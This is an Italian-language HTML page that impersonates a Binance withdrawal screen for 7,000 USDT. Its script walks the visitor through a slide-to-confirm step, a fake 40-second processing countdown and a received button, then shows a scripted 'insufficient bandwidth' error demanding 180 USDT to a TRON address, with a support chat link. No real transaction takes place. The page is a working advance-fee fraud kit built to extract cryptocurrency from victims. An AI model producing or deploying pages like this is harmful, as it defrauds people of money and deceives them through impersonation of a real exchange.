<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Recupero Prelievo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #0b0f1a;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      position: relative;
    }
    .app {
      background-color: #0b0f1a;
      width: 100%;
      max-width: 400px;
      padding: 30px;
      box-sizing: border-box;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(255,255,255,0.05);
    }
    .logo {
      text-align: center;
      font-size: 1.8em;
      font-weight: bold;
      margin-bottom: 20px;
      color: #f3ba2f;
    }
    .amount {
      text-align: center;
      font-size: 2em;
      margin-bottom: 10px;
    }
    .network {
      text-align: center;
      font-size: 0.95em;
      margin-bottom: 30px;
      color: #ccc;
    }
    .slider-container {
      background-color: #ffffff;
      border-radius: 50px;
      position: relative;
      height: 50px;
      width: 100%;
      margin-bottom: 30px;
      overflow: hidden;
      touch-action: pan-y;
    }
    .slider-track {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #0b0f1a;
      font-weight: bold;
      z-index: 1;
      user-select: none;
      pointer-events: none;
    }
    .slider-thumb {
      position: absolute;
      top: 4px;
      left: 4px;
      height: calc(100% - 8px);
      width: 50px;
      background-color: #f3ba2f;
      border-radius: 50px;
      cursor: pointer;
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: left 300ms ease;
      user-select: none;
      touch-action: none;
      box-shadow: 0 2px 6px rgba(0,0,0,0.25);
      font-weight: bold;
    }
    .section {
      display: none;
      margin-bottom: 20px;
    }
    .label {
      font-weight: bold;
      margin-bottom: 5px;
      color: #f3ba2f;
    }
    .value {
      margin-bottom: 15px;
      word-break: break-word;
      font-size: 1em;
      color: white;
    }
    .button {
      background-color: #f3ba2f;
      color: #0b0f1a;
      padding: 14px;
      border: none;
      border-radius: 6px;
      width: 100%;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }
    .button:disabled {
      background-color: #cccccc;
      color: #666666;
      cursor: not-allowed;
    }
    .error {
      color: #ffcccb;
      font-weight: bold;
      margin-top: 20px;
      text-align: center;
    }
    .address-box {
      background-color: #1a1f2b;
      padding: 10px;
      border-radius: 6px;
      text-align: center;
      font-size: 0.9em;
      margin-top: 10px;
      word-break: break-word;
      color: #fff;
    }
    .support-button {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #f3ba2f;
      color: #0b0f1a;
      padding: 10px 14px;
      border-radius: 6px;
      font-weight: bold;
      text-decoration: none;
      box-shadow: 0 0 10px rgba(255,255,255,0.1);
      z-index: 999;
    }
  </style>
</head>
<body>
  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">Contatta Supporto</a>

  <div class="app">
    <div class="logo">BINANCE</div>
    <div class="amount">7.000 USDT</div>
    <div class="network">Rete: TRC20</div>

    <!-- Slide to confirm -->
    <div class="slider-container" id="slider" aria-label="Scorri per confermare" role="group">
      <div class="slider-track" id="sliderTrack">Scorri per confermare</div>
      <div class="slider-thumb" id="thumb" role="button" tabindex="0" aria-pressed="false" aria-label="Pulsante scorri per confermare">→</div>
    </div>

    <!-- Preview -->
    <div class="section" id="preview">
      <h3>Anteprima Transazione</h3>
      <div class="label">Indirizzo Ricevente</div>
      <div class="value">TSchVxCkHRxS23PZMTsp38R9tjfPBmnxj2</div>
      <button class="button" onclick="startProcessing()">ELABORA PRELIEVO</button>
    </div>

    <!-- Processing -->
    <div class="section" id="processing">
      <p>Attendere mentre il pagamento viene accreditato sul tuo account...</p>
      <p id="timer">Caricamento: 0:40</p>
    </div>

    <!-- Received -->
    <div class="section" id="received">
      <button class="button" id="receivedBtn" disabled>HO RICEVUTO</button>
    </div>

    <!-- Error -->
    <div class="section" id="error">
      <div class="error">⚠️ ERRORE DI PRELIEVO: LARGHEZZA DI BANDA INSUFFICIENTE</div>
      <p class="value">Sono necessari 180 USDT per larghezza di banda e codice di allocazione prelievo</p>
      <p class="value">Il prelievo sarà ricevuto in 10 secondi dopo l'autorizzazione.</p>
      <div class="label">Indirizzo per il pagamento</div>
      <div class="address-box">TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o</div>
      <button class="button">PAGA ORA</button>
    </div>
  </div>

  <script>
    const slider = document.getElementById('slider');
    const thumb = document.getElementById('thumb');
    const track = document.getElementById('sliderTrack');

    let dragging = false;
    let confirmed = false;
    let startPointerX = 0;
    let thumbStartLeft = 0;

    // Utilities
    function clamp(val, min, max) { return Math.max(min, Math.min(max, val)); }

    function getBounds() {
      const rect = slider.getBoundingClientRect();
      const thumbRect = thumb.getBoundingClientRect();
      const minLeft = 4; // leave small padding from left
      const maxLeft = rect.width - thumbRect.width - 4; // padding from right
      return { rect, thumbRect, minLeft, maxLeft };
    }

    function setThumbLeft(x, animate = false) {
      if (animate) thumb.style.transition = 'left 300ms ease';
      else thumb.style.transition = 'none';
      thumb.style.left = x + 'px';
    }

    function animateThumbTo(x, cb) {
      setThumbLeft(x, true);
      // call callback after transition
      const onEnd = () => {
        thumb.removeEventListener('transitionend', onEnd);
        if (cb) cb();
      };
      thumb.addEventListener('transitionend', onEnd);
    }

    function confirmSlide() {
      if (confirmed) return;
      confirmed = true;
      thumb.setAttribute('aria-pressed', 'true');
      // hide slider and show preview
      slider.style.display = 'none';
      document.getElementById('preview').style.display = 'block';
    }

    function resetThumb() {
      const { minLeft } = getBounds();
      animateThumbTo(minLeft);
    }

    // Pointer events for drag
    thumb.addEventListener('pointerdown', (e) => {
      if (confirmed) return;
      dragging = true;
      thumb.setPointerCapture(e.pointerId);
      thumbStartLeft = parseFloat(thumb.style.left) || getBounds().minLeft;
      startPointerX = (e.clientX !== undefined) ? e.clientX : (e.touches && e.touches[0].clientX);
      thumb.style.transition = 'none';
    });

    document.addEventListener('pointermove', (e) => {
      if (!dragging || confirmed) return;
      const { rect, minLeft, maxLeft } = getBounds();
      const clientX = e.clientX;
      let delta = clientX - startPointerX;
      let newLeft = clamp(thumbStartLeft + delta, minLeft, maxLeft);
      setThumbLeft(newLeft, false);

      // If dragged fast to the end, we can auto-confirm early
      if (newLeft >= maxLeft - 6) {
        dragging = false;
        // animate fully to end then confirm
        animateThumbTo(maxLeft, () => confirmSlide());
      }
    });

    document.addEventListener('pointerup', (e) => {
      if (!dragging || confirmed) return;
      dragging = false;
      const { minLeft, maxLeft } = getBounds();
      const left = parseFloat(thumb.style.left) || minLeft;
      const threshold = maxLeft * 0.66; // 66% to confirm
      if (left >= threshold) {
        // animate to end and confirm
        animateThumbTo(maxLeft, () => confirmSlide());
      } else {
        // snap back
        resetThumb();
      }
    });

    // Click / tap on track to instantly confirm (if not dragging)
    track.addEventListener('pointerdown', (e) => {
      if (confirmed) return;
      // If user tapped the track (not the thumb), animate and confirm.
      // Small protection: if pointerdown target is thumb, ignore (thumb will handle).
      if (e.target === thumb) return;
      const { maxLeft } = getBounds();
      animateThumbTo(maxLeft, () => confirmSlide());
    });

    // Keyboard support
    thumb.addEventListener('keydown', (e) => {
      if (confirmed) return;
      const { minLeft, maxLeft } = getBounds();
      const step = 20;
      let left = parseFloat(thumb.style.left) || minLeft;
      if (e.key === 'ArrowRight') {
        left = clamp(left + step, minLeft, maxLeft);
        setThumbLeft(left, true);
      } else if (e.key === 'ArrowLeft') {
        left = clamp(left - step, minLeft, maxLeft);
        setThumbLeft(left, true);
      } else if (e.key === 'Enter' || e.key === ' ') {
        // space or enter confirms immediately
        animateThumbTo(maxLeft, () => confirmSlide());
      }

      // If moved to the end by keyboard
      if (left >= maxLeft - 6) {
        animateThumbTo(maxLeft, () => confirmSlide());
      }
    });

    // Initialize thumb position on load & on resize
    function initThumb() {
      const { minLeft } = getBounds();
      setThumbLeft(minLeft, false);
    }
    window.addEventListener('resize', () => {
      // reposition thumb appropriately on resize
      if (!confirmed) initThumb();
    });
    initThumb();

    // Existing functions below (preview -> processing -> received -> error)
    function startProcessing() {
      document.getElementById('preview').style.display = 'none';
      document.getElementById('processing').style.display = 'block';

      let time = 40;
      const timerEl = document.getElementById('timer');
      const interval = setInterval(() => {
        let seconds = time;
        timerEl.textContent = `Caricamento: 0:${seconds < 10 ? '0' : ''}${seconds}`;
        time--;
        if (time < 0) {
          clearInterval(interval);
          document.getElementById('processing').style.display = 'none';
          document.getElementById('received').style.display = 'block';
          enableReceivedButton();
        }
      }, 1000);
    }

    function enableReceivedButton() {
      let countdown = 10;
      const btn = document.getElementById('receivedBtn');
      const interval = setInterval(() => {
        countdown--;
        if (countdown === 0) {
          clearInterval(interval);
          btn.disabled = false;
          btn.onclick = showError;
        }
      }, 1000);
    }

    function showError() {
      document.getElementById('received').style.display = 'none';
      document.getElementById('error').style.display = 'block';
    }
  </script>
</body>
</html>
